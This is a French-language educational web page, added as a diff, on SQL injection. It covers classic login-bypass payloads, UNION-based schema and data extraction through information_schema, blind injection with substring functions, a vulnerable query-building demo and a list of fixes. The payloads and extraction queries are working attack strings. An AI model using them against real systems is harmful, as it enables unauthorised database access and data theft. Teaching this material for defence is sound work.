@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Vulnerabilities</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: "Inter", serif;
+            font-optical-sizing: auto;
+            font-weight: 300;
+            font-style: normal;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+
+        .vuln-title {
+            margin-top: 30px;
+            font-size: 1.5rem;
+            color: #007bff;
+            /* Bootstrap primary color */
+        }
+
+        .example-code {
+            background-color: #f0f0f0;
+            /* Light gray for code blocks */
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            /* Allows scrolling for long code */
+        }
+
+        .patch-section {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #28a745;
+            /* Green border for patch section */
+            border-radius: 5px;
+            background-color: #e9f7ef;
+            /* Light green background */
+        }
+
+        .custom-form {
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+            padding: 30px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .home_container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 10px;
+        }
+
+        .home_container img {
+            width: 50px;
+            height: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="home_container">
+        <img id="homeImage" src="../img/accueil.png" alt="Accueil"
+            onclick="window.location.href='../index_exercices.php'">
+    </div>
+
+    <div class="container">
+        <h1 class="text-center mb-4">Comprendre les injections SQL</h1>
+
+        <div class="vuln-title">C'est quoi une injection SQL ?</div>
+        <p>L'injection SQL est un type de vulnérabilité de sécurité qui se produit lorsqu'un attaquant parvient à
+            manipuler les requêtes SQL effectuées sur une base de données en injectant des données malveillantes. Cette
+            vulnérabilité résulte souvent d'une gestion inadéquate des entrées utilisateur, permettant aux attaquants
+            d'exécuter du code SQL arbitraire pouvant compromettre l'intégrité et la sécurité de la base de données.</p>
+
+        <div class="vuln-title">1. Classique injection SQL</div>
+        <br>
+        <p>Commençons par un exemple simple imaginons une page pour s'authentifier. Il existe sur internet plein de
+            dictionnaire contenant des payloads pour tester des injections.</p>
+        <div class="example-code">
+            <pre><code>' OR '1<br>' OR 1 -- -<br>" OR "" = "<br>" OR 1 = 1 -- -</code></pre>
+        </div>
+
+        <form id="loginForm" class="custom-form">
+            <div class="mb-3">
+                <label for="username" class="form-label">Nom d'utilisateur</label>
+                <input type="text" class="form-control" id="username" name="username"
+                    placeholder="Entrez votre nom d'utilisateur">
+            </div>
+            <div class="mb-3">
+                <label for="password" class="form-label">Mot de passe</label>
+                <input type="password" class="form-control" id="password" name="password"
+                    placeholder="Entrez votre mot de passe">
+            </div>
+            <button type="button" class="btn btn-primary" onclick="simulateSQLQuery()">Login</button>
+        </form>
+        <div class="vuln-title">Requete serveur</div>
+        <br>
+        <div id="example-code" class="example-code">
+        </div>
+
+
+        <div class="vuln-title">2. Union injection SQL</div>
+        <div class="vuln-title">Union sert à quoi ?</div>
+        <br>
+        <p>L'objectif principal est de forcer la base de données à retourner des informations supplémentaires qui ne
+            sont normalement pas accessibles via l'application.</p>
+
+        <div class="vuln-title">1er étape :</div>
+        <br>
+        <p>L'attaquant doit d'abord essayer de trouver le nombre exact de colonnes.
+            Le but étant d'augmenter le nombre de "NULL" jusqu'à ce que la requete renvoie vrai.
+        </p>
+        <div class="example-code">
+            <pre><code>UNION SELECT NULL;--<br>UNION SELECT NULL, NULL;-- <br>UNION SELECT NULL, NULL, NULL;--</code></pre>
+        </div>
+
+        <p>Pour déterminer le nombre de colonnes il existe différentes méthodes comme <i>ORDER BY, GROUP BY ...</i>
+        </p>
+
+        <div class="vuln-title">2e étape :</div>
+        <br>
+        <p>Extracter des informations sur la base de données dans notre cas on va s'aider de <i>information_schema</i>.
+        </p>
+        <br>
+        <p>Cette requête retourne tous les noms de la base de donnée.</p>
+
+        <div class="example-code">
+            <pre><code>UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata</code></pre>
+        </div>
+        <br>
+        <p>Cette requête récupère les noms de toutes les tables dans un schéma spécifié.</p>
+
+        <div class="example-code">
+            <pre><code>UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables 
+WHERE table_schema=PLACEHOLDER</code></pre>
+        </div>
+        <br>
+        <p>Cette requête retourne les noms des colonnes d'une table spécifié.</p>
+
+        <div class="example-code">
+            <pre><code>UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns 
+WHERE table_name=...</code></pre>
+        </div>
+        <br>
+        <p>Cette requête retourne n'importe quel champ d'une table spécifié.</p>
+
+        <div class="example-code">
+            <pre><code>UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...</code></pre>
+        </div>
+
+        <div class="vuln-title">3. Blind injection SQL</div>
+        <div class="vuln-title">Comment ça fonctionne ?</div>
+        <br>
+        <p>Contrairement à une injection SQL classique où l'attaquant peut voir les données extraites de la base de
+            données, dans une blind SQL injection, il n'y a pas de retour direct. L'attaquant doit se fier aux
+            comportements du serveur pour déduire des informations.</p>
+
+        <br>
+        <table>
+            <thead>
+                <tr>
+                    <th>Fonction</th>
+                    <th>Exemple</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>SUBSTR</td>
+                    <td>SUBSTR(version(),1,1)=5</td>
+                    <td>Extrait une sous-chaine d'une chaine (commence n'importe où)</td>
+                </tr>
+                <tr>
+                    <td>SUBSTRING</td>
+                    <td>SUBSTRING(version(),1,1)=5</td>
+                    <td>Extrait une sous-chaine d'une chaine (commence n'importe où)</td>
+                </tr>
+                <tr>
+                    <td>RIGHT</td>
+                    <td>RIGHT(left(version(),1),1)=5</td>
+                    <td>Extrait le nombre de caractères d'une chaine en commencant par la droite</td>
+                </tr>
+                <tr>
+                    <td>MID</td>
+                    <td>MID(version(),1,1)=4</td>
+                    <td>Extrait le nombre de caractères d'une chaine en commencant où on le souhaite</td>
+                </tr>
+                <tr>
+                    <td>LEFT</td>
+                    <td>LEFT(version(),1)=4</td>
+                    <td>Extrait le nombre de caractères d'une chaine en commencant par la gauche</td>
+                </tr>
+            </tbody>
+        </table>
+        <br>
+        <p>Voici un exemple de requête permettant de récupèrer des informations caractère par caractère sans retour
+            visuel</p>
+
+        <div class="example-code">
+            <pre><code>?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'  
+?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51</code></pre>
+        </div>
+        <br>
+        <p>Il existe différentes types de blind injection comme par exemple la <i>time-based blind injection</i> qui
+            utilise SLEEP() dans les requêtes ce qui lui permet de voir si la requête fonctionne.</p>
+
+        <div class="patch-section">
+            <strong>Patch:</strong><br>
+            <br>
+            <p>- <strong>Utilisation de requêtes préparées : </strong>Ces requêtes utilisent des paramètres liés pour
+                séparer le code SQL des données utilisateur, empêchant ainsi l'injection.</p>
+            <br>
+            <p>- <strong>Validation des entrées utilisateur : </strong>S'assurer que toutes les entrées utilisateur sont
+                validées et filtrées avant d'être utilisées dans les requêtes SQL.</p>
+            <br>
+            <p>- <strong>Échappement des caractères spéciaux : </strong>Utiliser des fonctions d'échappement.</p>
+            <br>
+            <p>- <strong>Configurer le serveur pour ne pas afficher d'erreurs SQL aux utilisateurs.</strong></p>
+            <br>
+            <p>- <strong>Restreindre l'accès aux tables sensibles : </strong>Limiter l'accès aux tables et aux colonnes
+                de la base de données afin de réduire les risques d'extraction de données sensibles.</p>
+            <br>
+            <p>- <strong>Surveillance des logs : </strong>Pour détecter des comportements suspects.</p>
+        </div>
+        <div class="text-center mt-5">
+            <button type="button" class="btn btn-primary"
+                onclick="window.location.href='../qcm/qcm_sql.php'">QCM</button>
+        </div>
+    </div>
+
+    <script>
+        function simulateSQLQuery() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const sqlQuery = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}';`;
+
+            document.getElementById('example-code').innerHTML = `<pre><code>${sqlQuery}</code></pre>`;
+        }
+    </script>
+
+
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
